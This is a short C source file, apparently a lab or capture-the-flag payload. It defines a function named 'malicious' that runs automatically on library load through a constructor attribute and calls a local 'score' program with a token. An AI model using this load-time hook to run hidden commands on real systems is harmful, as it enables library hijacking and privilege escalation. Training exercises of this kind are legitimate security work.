#include<stdio.h>
#include<stdlib.h>
	 
static void malicious() __attribute__((constructor));
 
void malicious() {
	system("/usr/local/bin/score 9b836bde-b6bd-4619-b24d-347987ab180a");
}
